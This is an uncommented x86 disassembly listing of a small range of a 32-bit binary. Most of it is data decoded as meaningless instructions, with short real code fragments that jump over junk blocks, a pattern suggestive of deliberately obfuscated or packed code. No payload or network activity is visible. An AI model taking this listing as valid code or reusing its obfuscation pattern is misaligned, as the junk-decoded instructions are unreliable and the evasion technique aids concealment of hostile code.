  40e99f:	outs   dx,DWORD PTR ds:[esi]
  40e9a0:	(bad)  
  40e9a1:	dec    edi
  40e9a2:	sahf   
  40e9a3:	inc    ebp
  40e9a4:	push   cs
  40e9a5:	pop    ecx
  40e9a6:	in     eax,dx
  40e9a7:	inc    edx
  40e9a8:	dec    esp
  40e9a9:	bound  ebx,QWORD PTR [ebx-0x42c009cf]
  40e9af:	jnp    0x40ea2f
  40e9b1:	stos   DWORD PTR es:[edi],eax
  40e9b2:	mul    bh
  40e9b4:	push   ebx
  40e9b5:	jno    0x40ea1e
  40e9b7:	fs xor al,0x86
  40e9ba:	add    BYTE PTR [ebp-0x1654e943],0x6
  40e9c1:	cmc    
  40e9c2:	out    dx,eax
  40e9c3:	mov    al,fs:0x6b9dcf1a
  40e9c9:	enter  0xde8e,0xf4
  40e9cd:	cld    
  40e9ce:	out    0xcc,al
  40e9d0:	cli    
  40e9d1:	test   al,0x9c
  40e9d3:	adc    dh,ch
  40e9d5:	mov    BYTE PTR [edi+0x5],bl
  40e9d8:	arpl   WORD PTR [edx],ax
  40e9da:	enter  0x6ccb,0x30
  40e9de:	call   0xe48c13a9
  40e9e3:	mov    cl,0x7f
  40e9e5:	adc    DWORD PTR fs:[edi-0xc],eax
  40e9e9:	sub    al,0x21
  40e9eb:	dec    esp
  40e9ec:	aas    
  40e9ed:	and    DWORD PTR [edx-0x34],ebp
  40e9f0:	test   eax,0xee993041
  40e9f5:	sbb    ebp,DWORD PTR [esi]
  40e9f7:	in     al,0x53
  40e9f9:	jg     0x40e995
  40e9fb:	xor    BYTE PTR [ecx+esi*2-0x80],ah
  40e9ff:	mov    WORD PTR [esi-0x75],?
  40ea02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea03:	ret    
  40ea04:	jl     0x40e9ab
  40ea06:	and    dl,BYTE PTR ds:0x129b2552
  40ea0c:	jno    0x40ea52
  40ea0e:	pushaw 
  40ea10:	addr16 dec ebx
  40ea12:	out    dx,al
  40ea13:	jb     0x40ea94
  40ea15:	or     DWORD PTR [esi+0x3f],edi
  40ea18:	mov    ah,0x1a
  40ea1a:	xor    esp,DWORD PTR [edi]
  40ea1c:	clc    
  40ea1d:	lods   eax,DWORD PTR ds:[esi]
  40ea1e:	or     eax,0x11741db5
  40ea23:	and    bh,dl
  40ea25:	mov    bh,0x5c
  40ea27:	mov    DWORD PTR [edx-0x19],edx
  40ea2a:	cwde   
  40ea2b:	int    0x5e
  40ea2d:	mov    ds,WORD PTR [eax+ecx*8+0x1b843f2e]
  40ea34:	push   ebp
  40ea35:	or     eax,0xe635ef1e
  40ea3a:	adc    bl,0x3e
  40ea3d:	xchg   edi,eax
  40ea3e:	xchg   esi,eax
  40ea3f:	push   eax
  40ea40:	in     eax,0x5a
  40ea42:	jns    0x40ea4b
  40ea44:	dec    ebx
  40ea45:	or     dl,BYTE PTR [ebx]
  40ea47:	cmc    
  40ea48:	popf   
  40ea49:	(bad)
  40ea4c:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40ea4e:	not    DWORD PTR [esi+0x9]
  40ea51:	mov    edi,0xaf57a4bf
  40ea56:	or     cl,BYTE PTR ds:0xd174cd0b
  40ea5c:	cmp    al,BYTE PTR [esi+0x66]
  40ea5f:	jge    0x40e9f2
  40ea61:	jle    0x40e9ed
  40ea63:	std    
  40ea64:	pop    eax
  40ea65:	cmc    
  40ea66:	retf   
  40ea67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea68:	xor    ebx,ebx
  40ea6a:	push   ebx
  40ea6b:	add    edx,DWORD PTR [esi+0x467715a2]
  40ea71:	inc    edi
  40ea72:	add    bh,BYTE PTR [ebx]
  40ea74:	in     al,0x77
  40ea76:	xchg   edi,eax
  40ea77:	sub    esp,edi
  40ea79:	std    
  40ea7a:	int    0x58
  40ea7c:	jno    0x40eaee
  40ea7e:	call   0xac25:0x625856ca
  40ea85:	test   al,0xad
  40ea87:	jmp    0x6a3e53fa
  40ea8c:	aaa    
  40ea8d:	adc    BYTE PTR [eax],0x5f
  40ea90:	inc    edi
  40ea91:	in     al,dx
  40ea92:	int    0xc9
  40ea94:	xor    esp,edx
  40ea96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea97:	sar    DWORD PTR [ebx+ecx*8-0x672e691],1
  40ea9e:	dec    edx
  40ea9f:	sbb    dh,BYTE PTR [ebx-0x597af0e1]
  40eaa5:	add    BYTE PTR [eax],al
  40eaa7:	add    BYTE PTR [ebx],al
  40eaa9:	retf   0x458b
  40eaac:	or     BYTE PTR [ecx+0x443cd9],al
  40eab2:	add    BYTE PTR [ebx+0x1513f04d],cl
  40eab8:	in     eax,0xfc
  40eaba:	inc    edx
  40eabb:	add    BYTE PTR [ebx],dh
  40eabd:	mov    BYTE PTR [ebx],0xc7
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e128,0x11
  40eade:	cmp    DWORD PTR ds:0x42e128,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e128,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e130
  40eafd:	push   0x42e16f
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e30f
  40eb15:	cmp    DWORD PTR ds:0x42e128,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e128
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e128,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e128
  40eb37:	dec    edx
  40eb38:	mov    DWORD PTR ds:0x42e128,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0x8e
  40eb8d:	cwde   
  40eb8e:	clc    
  40eb8f:	pop    ss
  40eb90:	imul   DWORD PTR [edi+0x7fc37070]
  40eb96:	jo     0x40ec08
  40eb98:	and    DWORD PTR [edx+0x61],esi
  40eb9b:	adc    eax,0xe544e8b7
  40eba0:	mov    esi,DWORD PTR [edx]
  40eba2:	pop    ebp
  40eba3:	and    ebp,DWORD PTR [ebx+eiz*2+0x1ac978ee]
  40ebaa:	mov    WORD PTR [eax-0x8],?
  40ebad:	adc    bl,BYTE PTR ds:0x118f4b7a
  40ebb3:	xor    eax,0x7f07b90b
  40ebb8:	jno    0x40eb4e
  40ebba:	fisttp WORD PTR [esi]
  40ebbc:	loop   0x40ec1c
  40ebbe:	test   eax,0xa0ea8f0e
  40ebc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebc4:	adc    BYTE PTR [ebx+0x55],bl
  40ebc7:	and    dl,bh
  40ebc9:	cs jns 0x40ebe5
  40ebcc:	push   edx
  40ebcd:	mov    edi,ss
  40ebcf:	pusha  
  40ebd0:	int3   
  40ebd1:	mov    DWORD PTR [ebx-0x27],eax
  40ebd4:	dec    edi
  40ebd5:	mov    edi,0x7e976780
  40ebda:	mov    dh,0xb2
  40ebdc:	dec    esi
  40ebdd:	xchg   DWORD PTR [esi+0x4cfc34c4],esp
  40ebe3:	pop    es
  40ebe4:	test   DWORD PTR [esi-0x19],edi
  40ebe7:	pop    eax
  40ebe8:	cmp    esi,DWORD PTR [ecx-0x1f]
  40ebeb:	loop   0x40ebec
  40ebed:	mov    ebp,0x9db1ec77
  40ebf2:	pop    edi
  40ebf3:	iret   
  40ebf4:	push   edx
  40ebf5:	call   0x7676:0xc416390d
  40ebfc:	lahf   
  40ebfd:	inc    ebp
  40ebfe:	dec    edi
  40ebff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec00:	adc    BYTE PTR [ebp-0x19f66872],ah
  40ec06:	push   ds
  40ec07:	out    dx,eax
  40ec08:	inc    ecx
  40ec09:	(bad)  
  40ec0a:	xchg   esp,eax
  40ec0b:	xor    eax,0xa944ea90
  40ec10:	cmp    BYTE PTR [ecx-0x57],ch
  40ec13:	arpl   WORD PTR [esi-0x32],cx
  40ec16:	popa   
  40ec17:	and    dh,BYTE PTR [edi+0x45edaad7]
  40ec1d:	cmp    ebx,DWORD PTR [ecx-0x11]
  40ec20:	fwait
  40ec21:	call   0xf1de11ec
  40ec26:	sbb    eax,0x4b6abde4
  40ec2b:	dec    eax
  40ec2c:	mov    ecx,0x7a181ff1
  40ec31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec32:	cmp    al,0x71
  40ec34:	adc    DWORD PTR [eax],ecx
  40ec36:	cmp    BYTE PTR [ebx+0x46],ah
  40ec39:	jb     0x40ec04
  40ec3b:	nop
  40ec3c:	xor    BYTE PTR [edx],bl
  40ec3e:	adc    bl,BYTE PTR [eax-0x24]
  40ec41:	ret    0x835f
  40ec44:	in     al,0x2b
  40ec46:	xor    al,0xaa
  40ec48:	cmp    BYTE PTR [edx-0x104bf14b],0xad
  40ec4f:	cmp    al,0x2d
  40ec51:	(bad)  
  40ec52:	mov    eax,0xcfeb0b4f
  40ec57:	scas   al,BYTE PTR es:[di]
  40ec59:	inc    ecx
  40ec5a:	xchg   ecx,eax
  40ec5b:	dec    ecx
  40ec5c:	in     al,0x3a
  40ec5e:	adc    ch,al
  40ec60:	mov    edi,0x9e17a719
  40ec65:	xchg   BYTE PTR [ebx+esi*4-0x43],cl
  40ec69:	out    dx,eax
  40ec6a:	aad    0x90
  40ec6c:	icebp  
  40ec6d:	pop    es
  40ec6e:	sub    cl,ch
  40ec70:	mov    ds:0x61bf5030,eax
  40ec75:	out    0x29,eax
  40ec77:	mov    eax,ds:0xa1889b3
  40ec7c:	les    edi,FWORD PTR [edi-0x27fdd173]
  40ec82:	lea    esi,[edx+0x1e2d28c1]
  40ec88:	imul   sp,WORD PTR [ebp+esi*2-0x48],0x7f7a
  40ec8f:	loop   0x40ec62
  40ec91:	xor    edi,eax
  40ec93:	sahf   
  40ec94:	mov    ecx,0xe54b6729
  40ec99:	adc    BYTE PTR [esi+edi*4+0x12],dl
  40ec9d:	adc    DWORD PTR [ebp+edi*4-0x52],esp
  40eca1:	mov    eax,ds:0x328e94f6
  40eca6:	scas   al,BYTE PTR es:[edi]
  40eca7:	push   esi
  40eca8:	into   
  40eca9:	mov    ecx,DWORD PTR [esi]
  40ecab:	push   es
  40ecac:	adc    BYTE PTR [ebp+0x8],al
  40ecaf:	push   esi
  40ecb0:	mov    dh,0x2d
  40ecb2:	jnp    0x40ed12
  40ecb4:	pop    ecx
  40ecb5:	jge    0x40eca2
  40ecb7:	push   ds
  40ecb8:	jmp    0xd407:0x33c25955
  40ecbf:	ds nop
  40ecc1:	std    
  40ecc2:	mov    ecx,0xbeee006f
  40ecc7:	in     al,dx
  40ecc8:	mov    al,BYTE PTR [ebp+0x18a4c90c]
  40ecce:	or     edi,DWORD PTR [edi]
  40ecd0:	push   ebp
  40ecd1:	mov    ebp,0x9463a267
  40ecd6:	mov    WORD PTR [eax+0x3be781a0],cs
  40ecdc:	sti    
  40ecdd:	pop    eax
  40ecde:	das    
  40ecdf:	addr16 push ss
  40ece1:	(bad)  [ebx]
  40ece3:	out    0xa8,al
  40ece5:	cmp    eax,ecx
  40ece7:	mov    eax,DWORD PTR [ebp-0x14]
  40ecea:	movzx  ecx,WORD PTR [ebp-0x4]
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ecc2
  40ed00:	dec    ebx
  40ed01:	sbb    cl,BYTE PTR [ecx-0x46]
  40ed04:	scas   al,BYTE PTR es:[edi]
  40ed05:	jo     0x40ed77
  40ed07:	ret    
  40ed08:	jg     0x40ed7a
  40ed0a:	jo     0x40ed7a
  40ed0c:	in     al,dx
  40ed0d:	and    al,0x57
  40ed0f:	dec    ebx
  40ed10:	inc    eax
  40ed11:	inc    esp
  40ed12:	fdiv   DWORD PTR ss:[ebx+0x15f1d37b]
  40ed19:	mov    cl,0x64
  40ed1b:	test   eax,0x248d3c3d
  40ed20:	xchg   ecx,eax
  40ed21:	arpl   di,ax
  40ed23:	mov    ebp,0xeceaef0c
  40ed28:	lods   al,BYTE PTR ds:[esi]
  40ed29:	imul   eax,ecx,0xffffff9b
  40ed2c:	aam    0xf6
  40ed2e:	jmp    0xaa71b7ef
  40ed33:	adc    al,0xc2
  40ed35:	add    bl,BYTE PTR [eax+0x2174b235]
  40ed3b:	or     eax,0x3e765926
  40ed40:	addr16 dec esp
  40ed42:	and    bh,bl
  40ed44:	or     cl,BYTE PTR [eax+0x1d]
  40ed47:	mov    ah,0x5c
  40ed49:	or     eax,0x76cf7cb6
  40ed4e:	into   
  40ed4f:	lods   al,BYTE PTR ds:[esi]
  40ed50:	das    
  40ed51:	jo     0x40ecf7
  40ed53:	inc    ebp
  40ed54:	icebp  
  40ed55:	and    BYTE PTR [edx-0x5709e17a],0x6a
  40ed5c:	nop
  40ed5d:	inc    esi
  40ed5e:	add    BYTE PTR ds:0x52d05a15,cl
  40ed64:	stc    
  40ed65:	dec    ecx
  40ed66:	jnp    0x40ecef
  40ed68:	sbb    cl,0xd4
  40ed6b:	pop    eax
  40ed6c:	inc    ecx
  40ed6d:	or     al,0x85
  40ed6f:	dec    edi
  40ed70:	xor    eax,0x6bd5d1c5
  40ed75:	push   ebp
  40ed76:	pop    edx
  40ed77:	out    0xef,eax
  40ed79:	adc    eax,0xe096e93f
  40ed7e:	lods   eax,DWORD PTR ds:[esi]
  40ed7f:	jmp    0x40ed03
  40ed81:	rcr    DWORD PTR ds:0x944ba45e,0xc6
  40ed88:	sahf   
  40ed89:	pop    eax
  40ed8a:	mov    dl,0x8d
  40ed8c:	jl     0x40ed6d
  40ed8e:	sbb    al,0x45
  40ed90:	aam    0x17
  40ed92:	sub    BYTE PTR [ecx],al
  40ed94:	repz inc BYTE PTR [edi+0x20]
  40ed98:	popf   
  40ed99:	lods   al,BYTE PTR ds:[esi]
  40ed9a:	xchg   ecx,eax
  40ed9b:	loope  0x40edbe
  40ed9d:	(bad)  [ecx]
  40ed9f:	jl     0x40edc8
  40eda1:	xor    ecx,ebx
  40eda3:	cmp    eax,0xc84ac609
  40eda8:	popa   
  40eda9:	(bad)  
  40edaa:	cmp    ah,al
  40edac:	gs out dx,eax
  40edae:	icebp  
  40edaf:	jl     0x40edb2
  40edb1:	add    ch,bh
  40edb3:	xor    eax,0x2e81c024
  40edb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edb9:	jae    0x40ed61
  40edbb:	stc    
  40edbc:	xor    al,0x2
  40edbe:	mov    eax,DWORD PTR [ecx]
  40edc0:	and    bl,BYTE PTR ds:0xb4f98d35
  40edc6:	xchg   esi,eax
  40edc7:	xor    eax,ebp
  40edc9:	pop    esp
  40edca:	retf   0x43f9
  40edcd:	cdq    
  40edce:	pushf  
  40edcf:	setb   al
  40edd2:	sub    BYTE PTR [ebx+0x40],dh
  40edd5:	(bad)  
  40edd6:	fnsave [ebx+0x7c234057]
  40eddc:	jp     0x40edbb
  40edde:	and    DWORD PTR [ebx+0x57f57df0],esi
  40ede4:	pop    edx
  40ede5:	xchg   ebp,eax
  40ede6:	push   cs
  40ede7:	retf   
  40ede8:	add    BYTE PTR [ebp+0x18],al
  40edeb:	push   0xaa8e9b93
  40edf0:	pop    esp
  40edf1:	test   DWORD PTR [ecx],edi
  40edf3:	iret   
  40edf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edf5:	mov    bh,0x99
  40edf7:	pop    esi
  40edf8:	cmp    DWORD PTR [eax],0x77124a1d
  40edfe:	fadd   st,st(4)
  40ee00:	lahf   
  40ee01:	or     al,0xd5
  40ee03:	pop    ss
  40ee04:	retf   
  40ee05:	sar    DWORD PTR [eax+0x3f],cl
  40ee08:	ins    BYTE PTR es:[edi],dx
  40ee09:	sub    al,0x9c
  40ee0b:	out    dx,eax
  40ee0c:	test   al,0x0
  40ee0e:	loop   0x40ee50
  40ee10:	jmp    0x40ee0c
  40ee12:	out    0xab,al
  40ee14:	fmul   st,st(3)
  40ee16:	jns    0x40ee39
  40ee18:	push   esp
  40ee19:	(bad)  
  40ee1a:	scas   al,BYTE PTR es:[edi]
  40ee1b:	icebp  
  40ee1c:	dec    edx
  40ee1d:	loopne 0x40ee81
  40ee1f:	jb     0x40eda3
  40ee21:	adc    al,BYTE PTR gs:[esp+esi*1]
  40ee25:	pop    ss
  40ee26:	dec    ecx
  40ee27:	sub    al,0x7c
  40ee29:	shl    DWORD PTR [esi+0x7d8ababc],1
  40ee2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee30:	in     al,dx
  40ee31:	mov    bl,0x13
  40ee33:	mov    esi,0x5232756a
  40ee38:	fcomp  DWORD PTR [edx-0x3b]
  40ee3b:	and    ebp,DWORD PTR [ebx]
  40ee3d:	test   eax,0x252260b9
  40ee42:	adc    BYTE PTR [ecx-0x9],dl
  40ee45:	add    dh,ch
  40ee47:	add    al,0xbf
  40ee49:	pusha  
  40ee4a:	mov    al,ds:0xf7ff1400
  40ee4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee50:	mov    esp,DWORD PTR [esi]
  40ee52:	loop   0x40eed1
  40ee54:	xchg   ebx,eax
  40ee55:	inc    ebx
  40ee56:	fisttp DWORD PTR [eax+0xf]
  40ee59:	(bad)  
  40ee5a:	jns    0x40ee5d
  40ee5c:	add    BYTE PTR [eax],al
  40ee5e:	xor    eax,esi
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0x75
  40ee7f:	dec    ebx
  40ee80:	or     bl,bl
  40ee82:	or     eax,0xc37070ac
  40ee87:	jg     0x40eef9
  40ee89:	jo     0x40ee97
  40ee8b:	leave  
  40ee8c:	shl    DWORD PTR [eax-0x1b],1
  40ee8f:	jbe    0x40ee40
  40ee91:	dec    edx
  40ee92:	(bad)  
  40ee93:	rcl    DWORD PTR [esi],cl
  40ee95:	ins    BYTE PTR es:[edi],dx
  40ee96:	push   edi
  40ee97:	aaa    
  40ee98:	pop    ds
  40ee99:	add    eax,0xbe14e4a7
  40ee9e:	mov    al,0xce
  40eea0:	std    
  40eea1:	jb     0x40ee50
  40eea3:	xchg   DWORD PTR ds:0xb0d55530,esi
  40eea9:	punpckldq mm2,DWORD PTR [edx]
  40eeac:	sub    eax,0x2789012d
  40eeb1:	pusha  
  40eeb2:	or     esi,esi
  40eeb4:	xor    esi,edi
  40eeb6:	dec    edi
  40eeb7:	xchg   esp,eax
  40eeb8:	int3   
  40eeb9:	pop    esi
  40eeba:	jg     0x40ee99
  40eebc:	lods   eax,DWORD PTR ds:[esi]
  40eebd:	sar    ch,cl
  40eebf:	shr    BYTE PTR ds:0x7a5aed42,cl
  40eec5:	sar    ebx,1
  40eec7:	adc    al,0xf1
  40eec9:	xchg   esi,eax
  40eeca:	in     eax,0xe0
  40eecc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eecd:	jle    0x40eeb1
  40eecf:	addr16 sbb al,0x6b
  40eed2:	sub    BYTE PTR [edi+esi*4],cl
  40eed5:	loop   0x40ef1c
  40eed7:	push   eax
  40eed8:	jb     0x40eeb0
  40eeda:	loope  0x40ee8c
  40eedc:	repnz push ebx
  40eede:	add    al,0xd9
  40eee0:	fnstsw WORD PTR [esi+0x76]
  40eee3:	sub    BYTE PTR [edx-0x4f],0xa3
  40eee7:	push   ss
  40eee8:	fst    st(4)
  40eeea:	adc    esp,esp
  40eeec:	sbb    ecx,ecx
  40eeee:	xor    DWORD PTR [ebx-0x17],0xffffff8d
  40eef2:	repz sbb esp,DWORD PTR [esi-0x42]
  40eef6:	jb     0x40eeb0
  40eef8:	dec    ebp
  40eef9:	dec    edx
  40eefa:	adc    cl,BYTE PTR [ebx+0x7c]
  40eefd:	fdiv   DWORD PTR [ecx]
  40eeff:	(bad)  
  40ef00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef01:	fnstsw WORD PTR [edx-0x49]
  40ef04:	inc    eax
  40ef05:	cld    
  40ef06:	jnp    0x40eef5
  40ef08:	cmp    BYTE PTR [eax+0x6f],ah
  40ef0b:	adc    al,0x63
  40ef0d:	xchg   esp,eax
  40ef0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef0f:	gs stc 
  40ef11:	cdq    
  40ef12:	iret   
  40ef13:	(bad)  
  40ef14:	icebp  
  40ef15:	jp     0x40eee1
  40ef17:	jnp    0x40ef95
  40ef19:	not    DWORD PTR [ecx+0x22]
  40ef1c:	xchg   BYTE PTR [edx-0x13],ah
  40ef1f:	sub    bh,cl
  40ef21:	mov    ecx,0xa2f5c68d
  40ef26:	sti    
  40ef27:	lods   eax,DWORD PTR ds:[esi]
  40ef28:	out    0x7b,eax
  40ef2a:	mov    ecx,0xbe7b3eb9
  40ef2f:	rol    BYTE PTR [ecx],cl
  40ef31:	rcr    BYTE PTR [ecx],0x73
  40ef34:	adc    DWORD PTR [edi+ebx*4],ebp
  40ef37:	fdivp  st(4),st
  40ef39:	inc    ebp
  40ef3a:	jmp    0x8f6a57b2
  40ef3f:	pop    edx
  40ef40:	push   esp
  40ef41:	add    DWORD PTR ds:0xdd83b140,eax
  40ef47:	or     al,0x1f
  40ef49:	retf   
  40ef4a:	mov    ecx,DWORD PTR [eax]
  40ef4c:	setg   dh
  40ef4f:	adc    edx,DWORD PTR [eax]
  40ef51:	xchg   BYTE PTR [ecx+0x6d],ch
  40ef54:	cwde   
  40ef55:	lock xor al,bh
  40ef58:	sbb    eax,0x452618a8
  40ef5d:	ret    
  40ef5e:	sti    
  40ef5f:	cmp    BYTE PTR [edx],ah
  40ef61:	adc    al,0x51
  40ef63:	xchg   edi,eax
  40ef64:	imul   esi,DWORD PTR [esi],0xeba464b7
  40ef6a:	xor    ecx,DWORD PTR [edi+0x22322b85]
  40ef70:	ins    DWORD PTR es:[edi],dx
  40ef71:	adc    eax,0x63b0956f
  40ef76:	push   es
  40ef77:	std    
  40ef78:	rol    edi,1
  40ef7a:	lods   al,BYTE PTR ds:[esi]
  40ef7b:	inc    edx
  40ef7c:	bound  edi,QWORD PTR [esi-0xa936c5e]
  40ef82:	daa    
  40ef83:	call   0xd8fb53ae
  40ef88:	inc    ebx
  40ef89:	jmp    0xd4951124
  40ef8e:	push   ecx
  40ef8f:	mov    esp,0x9c8ada34
  40ef94:	lods   al,BYTE PTR ds:[esi]
  40ef95:	push   eax
  40ef96:	addr16 rcr esi,0x63
  40ef9a:	push   ss
  40ef9b:	inc    edi
  40ef9c:	cmp    DWORD PTR [ebx+0x1b3c6b8a],esi
  40efa2:	pop    ss
  40efa3:	mov    ebp,0x3c037e0b
  40efa8:	xchg   DWORD PTR [edi-0x5],edx
  40efab:	adc    DWORD PTR [esi-0x1c],0xfffffff4
  40efaf:	mov    bl,0x32
  40efb1:	sbb    ebx,esi
  40efb3:	jnp    0x40eff9
  40efb5:	mov    ebx,0x96e5e1cf
  40efba:	pop    esi
  40efbb:	xor    ah,BYTE PTR [edx-0x5cb57b41]
  40efc1:	(bad)  
  40efc2:	mov    ds:0x7508ae98,eax
  40efc7:	cmp    eax,0xf97fa1f
  40efcc:	push   edx
  40efcd:	push   esp
  40efce:	xchg   edi,eax
  40efcf:	enter  0xabd,0xe9
  40efd3:	xchg   ecx,eax
  40efd4:	(bad)  
  40efd5:	das    
  40efd6:	hlt    
  40efd7:	xor    eax,esi
  40efd9:	lea    eax,[eax+ecx*1+0x32729c]
  40efe0:	mov    WORD PTR [ebp-0x4],ax
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	push   ebx
  40effb:	inc    eax
  40effc:	retf   0xd0d7
  40efff:	stos   DWORD PTR es:[edi],eax
  40f000:	jo     0x40f072
  40f002:	ret    
  40f003:	jg     0x40f075
  40f005:	jo     0x40efa1
  40f007:	add    esp,DWORD PTR [eax]
  40f009:	loope  0x40f04d
  40f00b:	ret    0xb5d3
  40f00e:	js     0x40f083
  40f010:	adc    DWORD PTR [esi+0x61f944bb],ebx
  40f016:	mov    al,0x8
  40f018:	sub    BYTE PTR [esi],al
  40f01a:	push   ecx
  40f01b:	sti    
  40f01c:	out    0x7,al
  40f01e:	pop    es
  40f01f:	xchg   esp,eax
  40f020:	sub    DWORD PTR [esi+ebp*4+0x1ef61e7d],ebp
  40f027:	mov    eax,0x77296b37
  40f02c:	loopne 0x40f009
  40f02e:	iret   
  40f02f:	jns    0x40f09e
  40f031:	sbb    cl,dl
  40f033:	inc    edx
  40f034:	je     0x40efc3
  40f036:	jne    0x40f091
  40f038:	mov    ?,WORD PTR [ebx]
  40f03a:	mov    ebx,0xa67d9893
  40f03f:	jecxz  0x40efef
  40f041:	jmp    0x260c:0x912a624c
  40f048:	aam    0xa9
  40f04a:	mov    bh,0xa
  40f04c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f04d:	es pop edx
  40f04f:	hlt    
  40f050:	cmp    al,0x8f
  40f052:	(bad)  
  40f053:	or     DWORD PTR [ecx],ebx
  40f055:	mov    ecx,0x2c30a6f7
  40f05a:	xchg   esi,eax
  40f05b:	out    0x97,al
  40f05d:	mov    esp,0xf91c0c77
  40f062:	xor    edi,ebp
  40f064:	mov    ebp,0x1194fb10
  40f069:	not    DWORD PTR ss:[ecx]
  40f06c:	lock icebp 
  40f06e:	jno    0x40f060
  40f070:	retf   0x344c
  40f073:	ins    WORD PTR es:[edi],dx
  40f075:	jle    0x40f072
  40f077:	pop    edx
  40f078:	test   DWORD PTR [eax+0x79],ebx
  40f07b:	clc    
  40f07c:	mov    eax,0x382ef94d
  40f081:	ud0    ebp,DWORD PTR [esi+esi*8+0x3be92cfc]
  40f089:	inc    ebx
  40f08a:	repnz (bad) 
  40f08c:	mov    DWORD PTR [ebp-0x3bd8b6a1],edx
  40f092:	mov    edx,0xa4c4615b
  40f097:	xlat   BYTE PTR ds:[ebx]
  40f098:	fsub   st,st(7)
  40f09a:	bound  eax,QWORD PTR [esi+0x2b8c2fa8]
  40f0a0:	push   cs
  40f0a1:	mov    ch,0xdf
  40f0a3:	jne    0x40f050
  40f0a5:	push   edx
  40f0a6:	sub    bl,dl
  40f0a8:	call   0x4c5f03c4
  40f0ad:	loopne 0x40f071
  40f0af:	div    DWORD PTR [eax-0x1294ca6c]
  40f0b5:	dec    ebp
  40f0b6:	cmp    BYTE PTR [ecx],bl
  40f0b8:	or     DWORD PTR [eax-0x3a],ecx
  40f0bb:	pop    ss
  40f0bc:	jle    0x40f12d
  40f0be:	mov    cl,0xd0
  40f0c0:	and    DWORD PTR [ebx-0x61],0xffffffdd
  40f0c4:	inc    edx
  40f0c5:	add    eax,0x79822071
  40f0ca:	and    al,0x2a
  40f0cc:	pop    eax
  40f0cd:	xchg   esp,eax
  40f0ce:	adc    dh,dh
  40f0d0:	fs (bad) 
  40f0d2:	xor    al,0x61
  40f0d4:	imul   DWORD PTR [eax]
  40f0d6:	fdivrp st(4),st
  40f0d8:	shl    DWORD PTR [edx-0x14c4aea6],cl
  40f0de:	dec    ecx
  40f0df:	ins    BYTE PTR es:[edi],dx
  40f0e0:	pop    esp
  40f0e1:	mov    ecx,0x4734da9c
  40f0e6:	fsubp  st(0),st
  40f0e8:	pop    eax
  40f0e9:	or     al,0xac
  40f0eb:	add    dl,bl
  40f0ed:	and    BYTE PTR [eax+0x2b],al
  40f0f0:	push   edx
  40f0f1:	neg    DWORD PTR [ebp+0x8]
  40f0f4:	ret    
  40f0f5:	test   al,0xa2
